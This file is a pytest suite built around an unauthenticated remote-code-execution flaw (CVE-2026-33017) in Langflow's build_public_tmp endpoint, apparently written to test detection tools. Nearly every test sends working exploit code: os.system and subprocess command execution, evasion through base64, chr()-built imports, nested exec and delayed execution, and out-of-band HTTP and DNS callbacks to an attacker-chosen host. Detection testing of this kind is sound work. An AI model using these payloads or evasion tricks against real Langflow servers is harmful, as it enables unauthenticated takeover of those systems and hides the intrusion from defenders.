"""
tests/test_cve_2026_33017.py
────────────────────────────
Structured pytest test suite for CVE-2026-33017
(Unauthenticated RCE via build_public_tmp data parameter — Langflow ≤ 1.8.1)

Coverage:
  TC-01  Baseline — legitimate public build, no exploit
  TC-02  Basic RCE — os.system canary write
  TC-03  Basic RCE — subprocess canary write
  TC-04  Evasion — base64-encoded payload
  TC-05  Evasion — chr() obfuscated import
  TC-06  Evasion — exec inside exec (double-wrapped)
  TC-07  Evasion — time-delayed payload (evade short-window detectors)
  TC-08  OOB — HTTP callback to controlled host
  TC-09  OOB — DNS lookup to controlled host
  TC-10  Canary — unique token per run, correlatable in OOB logs

Run:
  pytest tests/ -v
  LANGFLOW_URL=http://localhost:7860 pytest tests/ -v --tb=short
"""

import base64
import json
import time
import uuid
import urllib.request
import urllib.error
import pytest

from config import (
    LANGFLOW_URL,
    LANGFLOW_USER,
    LANGFLOW_PASS,
    OOB_HOST,
    load_flow_ids,
    canary_token,
    make_rce_flow,
)

# ── Helpers ───────────────────────────────────────────────────────────────────

def http(method, path, body=None, token=None, timeout=30):
    url = f"{LANGFLOW_URL}{path}"
    data = json.dumps(body).encode() if body else None
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, {}


def get_token():
    status, resp = http("POST", "/api/v1/login",
                        {"username": LANGFLOW_USER, "password": LANGFLOW_PASS})
    assert status == 200, f"Login failed: {status}"
    return resp["access_token"]


def build_public(flow_id, payload):
    """POST to the vulnerable endpoint — no auth."""
    return http("POST", f"/api/v1/build_public_tmp/{flow_id}/flow", payload)


@pytest.fixture(scope="session")
def flow_ids():
    ids = load_flow_ids()
    assert ids["echo_chat"], (
        "echo_chat flow ID not found. "
        "Run docker compose up and wait for bootstrap to complete, "
        "then copy flow_ids.json next to the test file or set ECHO_FLOW_ID."
    )
    return ids


@pytest.fixture(scope="session")
def auth_token():
    return get_token()


# ── TC-01 : Baseline ─────────────────────────────────────────────────────────

class TestBaseline:

    def test_legitimate_public_build(self, flow_ids):
        """
        TC-01 — Legitimate unauthenticated build_public_tmp call.
        No data param, just inputs. Should return 200/202 and a job_id.
        Your tool should NOT alert on this.
        """
        payload = {
            "inputs": [{"input_value": "Hello baseline", "components": []}]
        }
        status, resp = build_public(flow_ids["echo_chat"], payload)
        assert status in (200, 201, 202), f"Unexpected status: {status}"
        # Endpoint returns a job_id for polling
        assert "job_id" in resp or "id" in resp, f"No job_id in response: {resp}"

    def test_authenticated_run_not_flagged(self, flow_ids, auth_token):
        """
        TC-01b — Authenticated /run call.
        Confirms your tool distinguishes auth'd traffic from the exploit path.
        """
        payload = {
            "input_value": "Baseline authenticated message",
            "input_type": "chat",
            "output_type": "chat",
        }
        status, _ = http(
            "POST", f"/api/v1/run/{flow_ids['echo_chat']}",
            payload, token=auth_token
        )
        assert status in (200, 201, 202), f"Unexpected status: {status}"


# ── TC-02 / TC-03 : Basic RCE ────────────────────────────────────────────────

class TestBasicRCE:

    def test_os_system_canary(self, flow_ids):
        """
        TC-02 — RCE via os.system writing a canary file.
        Detectable by: HTTP 200 on request with data param (network),
        and/or file creation in container (process behaviour).
        """
        token = canary_token()
        code = f"""
import os
from langflow.custom import CustomComponent
from langflow.schema import Data

class RCEComponent(CustomComponent):
    display_name = "RCEComponent"
    description  = "test"

    def build(self) -> Data:
        os.system("echo '{token}' > /tmp/canary_tc02.txt")
        return Data(data={{"result": "ok"}})
"""
        status, resp = build_public(flow_ids["echo_chat"], {
            "data": make_rce_flow(code)
        })
        # Vulnerable: 200/202 accepted the payload
        # Patched:    422 (data param stripped) or 400
        assert status in (200, 201, 202), (
            f"TC-02: Expected vulnerable response, got {status}. "
            f"If this is intentional (patched build), mark xfail."
        )

    def test_subprocess_canary(self, flow_ids):
        """
        TC-03 — RCE via subprocess.run.
        Different code path from os.system — tests whether detector
        catches both execution methods.
        """
        token = canary_token()
        code = f"""
import subprocess
from langflow.custom import CustomComponent
from langflow.schema import Data

class RCEComponent(CustomComponent):
    display_name = "RCEComponent"
    description  = "test"

    def build(self) -> Data:
        subprocess.run(["sh", "-c", "echo '{token}' > /tmp/canary_tc03.txt"])
        return Data(data={{"result": "ok"}})
"""
        status, resp = build_public(flow_ids["echo_chat"], {
            "data": make_rce_flow(code)
        })
        assert status in (200, 201, 202), f"TC-03: got {status}"


# ── TC-04 / TC-05 / TC-06 / TC-07 : Evasion ─────────────────────────────────

class TestEvasion:

    def test_base64_encoded_payload(self, flow_ids):
        """
        TC-04 — Payload encoded in base64, decoded and exec'd at runtime.
        Evades naive string-matching on 'os.system' or 'subprocess'.
        """
        token = canary_token()
        inner = f"import os; os.system(\"echo '{token}' > /tmp/canary_tc04.txt\")"
        b64   = base64.b64encode(inner.encode()).decode()

        code = f"""
import base64
from langflow.custom import CustomComponent
from langflow.schema import Data

class RCEComponent(CustomComponent):
    display_name = "RCEComponent"
    description  = "test"

    def build(self) -> Data:
        exec(base64.b64decode("{b64}").decode())
        return Data(data={{"result": "ok"}})
"""
        status, _ = build_public(flow_ids["echo_chat"], {
            "data": make_rce_flow(code)
        })
        assert status in (200, 201, 202), f"TC-04: got {status}"

    def test_chr_obfuscated_import(self, flow_ids):
        """
        TC-05 — Import constructed via chr() concatenation.
        Evades static analysis looking for the string 'import os'.
        """
        token = canary_token()
        # Builds: __import__('os').system("echo TOKEN > /tmp/canary_tc05.txt")
        os_str     = "+".join(f"chr({ord(c)})" for c in "os")
        cmd_str    = "+".join(f"chr({ord(c)})" for c in f"echo '{token}' > /tmp/canary_tc05.txt")

        code = f"""
from langflow.custom import CustomComponent
from langflow.schema import Data

class RCEComponent(CustomComponent):
    display_name = "RCEComponent"
    description  = "test"

    def build(self) -> Data:
        __import__({os_str}).system({cmd_str})
        return Data(data={{"result": "ok"}})
"""
        status, _ = build_public(flow_ids["echo_chat"], {
            "data": make_rce_flow(code)
        })
        assert status in (200, 201, 202), f"TC-05: got {status}"

    def test_double_wrapped_exec(self, flow_ids):
        """
        TC-06 — exec() inside exec() — double-wrapping.
        Tests whether your tool follows nested execution chains.
        """
        token = canary_token()
        inner = f"import os; os.system(\"echo '{token}' > /tmp/canary_tc06.txt\")"
        outer = f"exec({repr(inner)})"

        code = f"""
from langflow.custom import CustomComponent
from langflow.schema import Data

class RCEComponent(CustomComponent):
    display_name = "RCEComponent"
    description  = "test"

    def build(self) -> Data:
        exec({repr(outer)})
        return Data(data={{"result": "ok"}})
"""
        status, _ = build_public(flow_ids["echo_chat"], {
            "data": make_rce_flow(code)
        })
        assert status in (200, 201, 202), f"TC-06: got {status}"

    def test_time_delayed_payload(self, flow_ids):
        """
        TC-07 — Execution delayed by 5s inside the payload.
        Tests whether your tool's detection window covers async/delayed
        process behaviour after the HTTP response is returned.
        """
        token = canary_token()
        code = f"""
import time, os
from langflow.custom import CustomComponent
from langflow.schema import Data

class RCEComponent(CustomComponent):
    display_name = "RCEComponent"
    description  = "test"

    def build(self) -> Data:
        time.sleep(5)
        os.system("echo '{token}' > /tmp/canary_tc07.txt")
        return Data(data={{"result": "ok"}})
"""
        status, _ = build_public(flow_ids["echo_chat"], {
            "data": make_rce_flow(code)
        })
        assert status in (200, 201, 202), f"TC-07: got {status}"
        # Give the delayed execution time to fire before test teardown
        time.sleep(8)


# ── TC-08 / TC-09 / TC-10 : OOB / Canary ────────────────────────────────────

class TestOOBCanary:
    """
    Out-of-band detection tests.
    These require OOB_HOST to be set to a host you control
    (e.g. Burp Collaborator, interactsh.com, canarytokens.org).

    Skip these if OOB_HOST is not configured.
    """

    @pytest.fixture(autouse=True)
    def require_oob(self):
        if OOB_HOST == "YOUR.OOB.HOST" or not OOB_HOST:
            pytest.skip("OOB_HOST not configured — set the OOB_HOST env var")

    def test_oob_http_callback(self, flow_ids):
        """
        TC-08 — RCE triggers an outbound HTTP request to OOB host.
        Detectable via: network egress from the Langflow container,
        and/or callback received at your OOB listener.
        """
        token = canary_token()
        code = f"""
import urllib.request
from langflow.custom import CustomComponent
from langflow.schema import Data

class RCEComponent(CustomComponent):
    display_name = "RCEComponent"
    description  = "test"

    def build(self) -> Data:
        try:
            urllib.request.urlopen(
                "http://{OOB_HOST}/?canary={token}",
                timeout=10
            )
        except Exception:
            pass
        return Data(data={{"result": "ok"}})
"""
        status, _ = build_public(flow_ids["echo_chat"], {
            "data": make_rce_flow(code)
        })
        assert status in (200, 201, 202), f"TC-08: got {status}"
        print(f"\n  → OOB canary: {token}")
        print(f"  → Expected callback: http://{OOB_HOST}/?canary={token}")

    def test_oob_dns_lookup(self, flow_ids):
        """
        TC-09 — RCE triggers a DNS lookup to OOB host.
        DNS-based OOB is harder to block than HTTP — tests
        whether your tool catches network-layer DNS egress.
        """
        token = canary_token()
        subdomain = f"{token}.{OOB_HOST}"
        code = f"""
import socket
from langflow.custom import CustomComponent
from langflow.schema import Data

class RCEComponent(CustomComponent):
    display_name = "RCEComponent"
    description  = "test"

    def build(self) -> Data:
        try:
            socket.gethostbyname("{subdomain}")
        except Exception:
            pass
        return Data(data={{"result": "ok"}})
"""
        status, _ = build_public(flow_ids["echo_chat"], {
            "data": make_rce_flow(code)
        })
        assert status in (200, 201, 202), f"TC-09: got {status}"
        print(f"\n  → DNS canary subdomain: {subdomain}")

    def test_unique_canary_per_run(self, flow_ids):
        """
        TC-10 — Each test run uses a unique canary token.
        Verifies your OOB infrastructure can correlate callbacks
        back to specific test executions.
        Fires two requests with different tokens — both should appear
        independently in your OOB logs.
        """
        tokens = [canary_token(), canary_token()]
        assert tokens[0] != tokens[1], "Canary tokens must be unique"

        for token in tokens:
            code = f"""
import urllib.request
from langflow.custom import CustomComponent
from langflow.schema import Data

class RCEComponent(CustomComponent):
    display_name = "RCEComponent"
    description  = "test"

    def build(self) -> Data:
        try:
            urllib.request.urlopen(
                "http://{OOB_HOST}/?canary={token}",
                timeout=10
            )
        except Exception:
            pass
        return Data(data={{"result": "ok"}})
"""
            status, _ = build_public(flow_ids["echo_chat"], {
                "data": make_rce_flow(code)
            })
            assert status in (200, 201, 202), f"TC-10: got {status} for token {token}"
            print(f"\n  → Canary fired: {token}")
            time.sleep(2)
